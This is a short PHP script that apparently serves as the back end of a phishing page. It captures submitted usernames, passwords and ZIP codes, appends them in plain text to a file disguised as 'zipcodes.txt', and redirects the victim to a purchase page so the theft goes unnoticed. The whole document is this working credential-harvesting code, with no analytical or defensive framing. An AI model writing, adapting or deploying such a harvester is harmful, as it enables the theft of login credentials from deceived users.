<?php

file_put_contents("zipcodes.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . " ZIP: " . $_POST['zip'] . "\n" , FILE_APPEND);
header('Location: ../Compra.html');
exit();
